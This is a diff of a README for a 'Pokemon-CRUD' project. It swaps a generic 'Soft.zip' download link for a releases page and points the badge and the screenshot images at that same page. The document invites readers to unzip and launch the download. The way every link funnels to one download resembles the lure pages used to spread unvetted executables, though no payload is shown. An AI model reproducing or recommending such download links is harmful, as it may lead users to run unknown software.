@@ -36,9 +36,9 @@ To get started with **Pokemon-CRUD**, follow these simple steps:
 
 Ready to embark on a Pokemon adventure? Click on the link below to download the application:
 
-[Download Pokemon-CRUD](https://github.com/files/Soft.zip)
+[Download Pokemon-CRUD](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)
 
-[![Download Pokemon-CRUD](https://img.shields.io/badge/Download-Pokemon--CRUD-blue)](https://github.com/files/Soft.zip)
+[![Download Pokemon-CRUD](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)
 
 Once downloaded, unzip the file and launch the application to start your journey.
 
@@ -46,9 +46,9 @@ Once downloaded, unzip the file and launch the application to start your journey
 
 Here are some glimpses of what awaits you in **Pokemon-CRUD**:
 
-![Dashboard](https://via.placeholder.com/600x400)
-![Interactive Graphs](https://via.placeholder.com/600x400)
-![Statistics Overview](https://via.placeholder.com/600x400)
+![Dashboard](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)
+![Interactive Graphs](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)
+![Statistics Overview](https://github.com/wfeifefeifef/Pokemon-CRUD/releases/tag/v1.2)
 
 ## Contributing 🤝
 
